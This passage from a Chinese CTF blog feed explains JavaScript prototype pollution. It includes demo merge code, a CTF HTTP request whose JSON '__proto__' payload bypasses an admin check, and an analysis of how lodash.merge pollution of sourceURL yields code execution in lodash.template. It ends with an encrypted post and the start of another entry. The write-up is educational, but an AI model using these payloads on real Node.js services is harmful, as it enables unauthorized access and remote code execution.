Foo.prototype</li><li>每个构造函数(constructor)都有一个原型对象(prototype)</li></ol><p><strong>原型链污染</strong>利用的就是JavaScript这个继承的机制，通过类A污染原型类，从而达到修改同一原型的类B的成员变量和函数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// foo是一个简单的JavaScript对象</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">bar</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token comment">// foo.bar 此时为1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token comment">// 修改foo的原型（即Object）</span>foo<span class="token punctuation">.</span>__proto__<span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token number">2</span><span class="token comment">// 由于查找顺序的原因，foo.bar仍然是1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span class="token comment">// 此时再用Object创建一个空的zoo对象</span><span class="token keyword">let</span> zoo <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">// 查看zoo.bar</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>zoo<span class="token punctuation">.</span>bar<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>以上代码的运行结果为</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">112<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>foo对象通过<code>__proto__</code>属性修改了foo的原型，然后新建的zoo继承了该变量，下面可以看一张调试图</p><p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221119234850521.png" alt="image-20221119234850521"></p><p>修改了Foo的原型的bar，设置其为2，然后执行到<code>let zoo=&#123;&#125;</code></p><p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221119234947567.png" alt="image-20221119234947567"></p><p>实际上zoo自己没有这个属性，由于前面提到的查找顺序，导致了会向zoo的<code>__proto__</code>中寻找，所以找到了目标变量。</p><p>下面给一个例子，merge函数</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> source</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> source<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token keyword">in</span> source <span class="token operator">&amp;&amp;</span> key <span class="token keyword">in</span> target<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">merge</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>key<span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> o1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> o2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string-property property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">merge</span><span class="token punctuation">(</span>o1<span class="token punctuation">,</span> o2<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o1<span class="token punctuation">.</span>a<span class="token punctuation">,</span> o1<span class="token punctuation">.</span>b<span class="token punctuation">)</span>o3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o3<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>merge函数的意思是复制，具体的方法看函数实现可以知道，如果有相同的key就覆盖，没有就创建。</p><p>按理说，执行完毕下面的代码之后，o1的<code>__proto__</code>就变成了<code>&#123;b : 2&#125;</code></p><p>输出的话o1.b=2</p><p>但是运行之后，发现结果不是这样。</p><p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221119235809441.png" alt="image-20221119235809441"></p><blockquote><p>o3并没有继承到相关的方法</p></blockquote><p>查看后发现o1获得了b这个属性，但是b存在于o1中而不是o1的prototype中。</p><p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221119235905696.png" alt="image-20221119235905696"></p><p>这就是出现问题的点，o1和o2不是一个原型，即<code>__proto__</code>没有被识别为一个key，（可以跟进去遍历merge得到结果）</p><blockquote><p>这是因为，我们用JavaScript创建o2的过程（<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>）中，<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p></blockquote><p>做出的改变是，使用json函数格式化数据，而不是手动的引号</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> o1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> o2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span><span class="token punctuation">)</span><span class="token function">merge</span><span class="token punctuation">(</span>o1<span class="token punctuation">,</span> o2<span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o1<span class="token punctuation">.</span>a<span class="token punctuation">,</span> o1<span class="token punctuation">.</span>b<span class="token punctuation">)</span>o3 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>o3<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><img src="https://raw.githubusercontent.com/pwnEpiphany/images/main/image-20221120000209850.png" alt="image-20221120000209850"></p><p>成功污染</p><h3 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h3><p>例题很简单，做了很久是因为没有考虑到上面说的json，</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag'</span><span class="token punctuation">;</span><span class="token keyword">var</span> admin <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"copy error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>admin<span class="token punctuation">.</span>id<span class="token operator">===</span><span class="token string">'unctf'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>copy函数可以利用，通过user污染admin即可，重点在于发出的数据包，添加<code>Content-type</code>，设置为<code>application/json</code>否则POST的数据就会被识别为字符，导致上面说的错误</p><figure><div class="code-wrapper"><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Pragma</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span><span class="token header"><span class="token header-name keyword">Cache-Control</span><span class="token punctuation">:</span> <span class="token header-value">no-cache</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.9</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">28</span></span><span class="token application-json"><span class="token punctuation">&#123;</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"id"</span><span class="token operator">:</span><span class="token string">"unctf"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><hr><h3 id="code-breaking-2018-Thejs"><a class="header-anchor" href="#code-breaking-2018-Thejs">¶</a>code breaking 2018 Thejs</h3><p>来源是P神的博客，后端的主要代码如下：<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">原仓库</a></p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token keyword">const</span> lodash <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token keyword">const</span> randomize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'randomatic'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'thejs.session'</span><span class="token punctuation">,</span>    <span class="token literal-property property">secret</span><span class="token operator">:</span> <span class="token function">randomize</span><span class="token punctuation">(</span><span class="token string">'aA0'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'ejs'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">filePath<span class="token punctuation">,</span> options<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// define the template engine</span>    fs<span class="token punctuation">.</span><span class="token function">readFile</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">let</span> compiled <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">template</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>        <span class="token keyword">let</span> rendered <span class="token operator">=</span> <span class="token function">compiled</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token operator">...</span>options<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token function">callback</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> rendered<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> <span class="token string">'./views'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">language</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token literal-property property">category</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        data <span class="token operator">=</span> lodash<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> req<span class="token punctuation">.</span>body<span class="token punctuation">)</span>        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> data    <span class="token punctuation">&#125;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">language</span><span class="token operator">:</span> data<span class="token punctuation">.</span>language<span class="token punctuation">,</span>         <span class="token literal-property property">category</span><span class="token operator">:</span> data<span class="token punctuation">.</span>category    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Example app listening on port 3000!</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>冗余的代码可以不去理会，很容易关注到请求处理的函数，函数接收数据，然后通过<code>merge</code>哈数复制给data，最后存储在<code>session</code>中，这里需要提一下<code>lodash</code></p><p><code>lodash</code>是为了弥补<code>JavaScript</code>原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了<code>lodash</code>提供的两个工具：</p><ol><li><code>lodash.template</code> 一个简单的模板引擎</li><li><code>lodash.merge</code> 函数或对象的合并</li></ol><p>这里很容易发现，merge是存在原型链污染的，可以污染<code>Object</code>类，相当于可以给Object对象插入任意属性，这个插入的属性反应在最后的<code>lodash.template</code>中。</p><p>整个breaking的代码我没有仔细分析过，P神在template的代码中截下来下面这样一段代码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Use a sourceURL for easier debugging.</span><span class="token keyword">var</span> sourceURL <span class="token operator">=</span> <span class="token string">'sourceURL'</span> <span class="token keyword">in</span> options <span class="token operator">?</span> <span class="token string">'//# sourceURL='</span> <span class="token operator">+</span> options<span class="token punctuation">.</span>sourceURL <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token comment">// ...</span><span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token function">attempt</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">Function</span><span class="token punctuation">(</span>importsKeys<span class="token punctuation">,</span> sourceURL <span class="token operator">+</span> <span class="token string">'return '</span> <span class="token operator">+</span> source<span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">,</span> importsValues<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><blockquote><p>options是一个对象，sourceURL取到了其<code>options.sourceURL</code>属性。这个属性原本是没有赋值的，默认取空字符串。</p><p>但因为原型链污染，我们可以给所有Object对象中都插入一个<code>sourceURL</code>属性。最后，这个<code>sourceURL</code>被拼接进<code>new Function</code>的第二个参数中，造成任意代码执行漏洞。</p></blockquote><p>发出的payload如下：</p><p><img src="https://gitee.com/ethereal8233/images/raw/master/img/image-20221121203456435.png" alt="image-20221121203456435"></p><p>payload大致就是按照原来的思想，确实执行了命令/</p><h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2><p>复现和学习的过程中参考了很多别的资料，pwn选手会的web知识还不是很多，code breaking基本上就是了解了一下污染，没有深入的研究，反序列化有了较深的认识，总的来说web还是蛮有意思的。。。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>知者不言，言者不知</title>
    <link href="/2022/09/22/%E7%9F%A5%E8%80%85%E4%B8%8D%E8%A8%80%EF%BC%8C%E8%A8%80%E8%80%85%E4%B8%8D%E7%9F%A5/"/>
    <url>/2022/09/22/%E7%9F%A5%E8%80%85%E4%B8%8D%E8%A8%80%EF%BC%8C%E8%A8%80%E8%80%85%E4%B8%8D%E7%9F%A5/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="再试试nc看看" data-whm="禁止修改">  <script id="hbeData" type="hbeData" data-hmacdigest="19c2c4e9256ed2967c7ec248b5064bf1b5bdaad9b23db974fc770b6e22bf902e">7b72ac4e0b31ed8abdb9f68da00f0168b1f36a22b128a9c9c80ba300a0d4c23373eed2413e35bf2da1b421171ce904808142c720e007ba45eba2bc791e7b66b4b493e77869ead1cf1bdd55ab4775510a95624d0a867f263daa3365dc1d153973ef4b4dd9968c6b3586215d814e6914b40a1a50cf772399a92cab83b9fe56a3f0b1abacf6b764217c1935927407a0adad157ee533f744cd3b9b6acf12f3072cabfcc0ddbacc55c3c630355d7aba2222e09c006036c1b2028bf482448b35eb31c261a577c5d839efb23a84992ce5d0f95ff30f78934b4bb659c6064a1145aa23464544b7196da0f1af314e047c2b85cc16274ba729958d28f7332d78237b50408d9f764ac27feefc83e758ed3a3013010db3c9dc500d370cdfe29e93a78b1dd8eb1065ff3f041bcc194346919d50b471b13264c21981ed3a1670a8ef91ef588f78e7327bd9e7f3540bfd77d6c4b18a9c57a160f927d0d756180d2b7a2eb4a8c444df32296617f5534f233bdb9b35d24d03df7386e605ffe026a4645f131c3e9eb92dd5f6a9b256131af6572b5b9047abe5498d901525460b1bb55204b2f91be162282cf4ec93fa0c19b02680391e4793305191fea574440df6b4e4ff0a2ecab9e72e7a265e56f0cad051a1a740f3fa5d0f80c39a11787b0a6d15a77fdf2ec30bc3f1c8deead0e1fc05a8fad824bde69c41b83a3a0caba92a5bd827115821e2b0efdd2d788209c401a20667d5e108ad253624bbac01c8717d11e99588e595a6f0e77c0028405189ba7dec00d395babb0dbe792d70f378e53d5794f5ca3b38abc5ca674f10c2c3defad8bb9c43f3b98a75701899c5756f3baf5cf23efefc8dbeb5727c80d9e03a784b6534e2c7c0bab5b8a5a441893a87ba6e8490aa087de2d2cde545e8cee287cd9c324bf3128cdcc2db0b754a4cd8584f8ac71a84b1877dedab4902d375fd008cda89af578a06383527f201120da87723f7e819dbbda9e67886b0e6af357cd0b5afe20cb0504dd2b80df48eac4fae8d7cb7f6a762f0067406ca8275b511b89353c7ef06e43dc1b2609b423ca2a95d93d932766507aba8c02fbc3e98319c4ee6f9157398cf19c61a93363d33a47fb60305ce7dc933b2c096ef12cbcd26cd5bd78d46896a6d9f862e9ef58ce408e48a7fdb0cb97cc26ddc76ece8cf6a196326b1d46bcb3989a8b11948914a0259e3e80fbb604cf100b479b380cd8df3712399af90b74fb77445e10b54576b39c0dc60b59f85543d63c15d1c58a139b9f39f5dc0c524ef16188f18cebc013329de192b719ebebd44af3693b7c319cd9eb6b3a31f6d2edd28f876cbc07ddbb52e82a7e32d1fd6b4de8c1588820931f5f199b10e2fd6f6cc66beb64e4e7b0bab11a4d41875feb324a73022d93d66a22710bc26f551b27414dcb18327cbd1c4da4bb307589208c75404881e57f761819f99cc35f82f31b15b4eac0ca07437b4de10588fd0c7a085011d8d48554b1fe0ae9dc9a6048bba4d5aa34f5e66f373e072a201599f34c622ca15e3cd3c42b1eece7af1be41c4322353a27f38bdf9428c765ff06b23f221fe1e88cfdbd7facee6a2a3632ddca89189f2de12654609a85cab8aad468766112a2a80d7129cf92a3d02eb1e07872c117bca095310a3f5f3e6e129d7d3cd80bf4ce47adeed99051c9e24732b8f0b439defa0f27a8ea295191ce724df9f5afcf5373bd2e2a98571bb7ec13bcadad25eb3da83a86b2eb11232637d5d468a590b298fadc7e00ca07217de163ed40bc1b92f2a9360fe1582681e2ca16f9a74816e653c096f62a19469fb5d44ddc76175f9e8333c1b18db14048720237db3f56034d728d093d64cbe2464129b462cf5a0e378be5c14f0d6a90a86e118a815c3ae9d19342d5327df3a6e31a85feabf14c6fe7abfc3d7c79210be29e414903fb509d3d238e890a52fca3e86cfbb7b92e87e166103275676da32603f99ed927ae2846e0d86476d64dc0f114c5051a0df0439531c72d8e5106a2aa737c8920dd84083cfcf3fe6b802f2d100ac5f8552de0198dce6ffa538929d1596fe4f784df4c50469a27dbb78037d59789207b919b9e418064bbec0e302728cf3d56cec9fa9c9c9b4a916881213095e054d6654de0098da1d5cf9f4ff15f21033561d893bcf844b46bb1bb20ec14ece2e0408e4cd45b1f997dfec8e13e6413c3a9f87779180e5b31052fef37e2e7fb2022a6cc1d93a864d5ef49c65415477ad62df0d54a799da87f3151fd69e97726ba80cdde14ad085b32266e837eda82f5bd1accd4b0a9536894e9cad14aef68afd807739ab4f6a94966df62314cefb228b0a1589fcfd82aeab138f671b81309a58f18c7ce844861f5330b25b7826d28306ed7657d0665daf3422c319d6fd1cc3381177cd83b7df68da6d9eb2ccbb2bc78b990a382adea4ecd4860facfe8781a141b94c6e5773fb25a2062ad5f20b0693972f337d4a73201d3eb8dbaca838219004ccf01c14a7882f1f67654ba84fc7f5cfd54bb681a22d384770792ecda50ea3348a75171fc7cd412bda95130c305ce66a319cc04e0f775aee479c37b85f9e047b3f1a94e2694f0b6f293d8391109fce826819abcc01bb1bdc5caabc803b83347c3474bf87fa103ef0bcfe987916d791172eba40630de00e2667f6fb19edf0eb84da3710a80934344d1d1a21d200d1a0b45db8ee91fba65d182540b53df1a5ad746dff5cabb3e22e082c1ca0506c8d3d8ce65018f16fe11c45702680a39dd6bff3a1d552398801bcab8bc4c38f634621e37338e7679239c05690c4544baf39f08f704316b788446ef95502fe17abec90d311c6676c8241ed374b01a55980a73ab26acc2746072993a9296f8dc5802c2cf1716909dda00905dfd7f4c796eca5dd792fc8556f9ad1e9b0113752b9380fef974aa8608d02403bf08ad77e7db4147e78e79d67473c459029c0bcda50d9da89eb21b17a05d2d041e2368ce3db2ae92da63270171096173b9d2dc9f141c1058e9478239d7bf3312690835804f42a638a7ed522c6799a2e17a50cf15704962597b4b319e22abfaf345ae50e2c0fb2b4875aa7d93ed5d29b026e20673be632e29cf28e37ce1116e6599173708f7f89410260769700da8c1a03633c147b773e3282bf7f937c087cc33688db09e46c3d646610064b77794191a2669c30a58d9742e1ba34758754</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">chat nc 43.96.147.93</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>chats</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>不想拿flag了，想要shell</title>
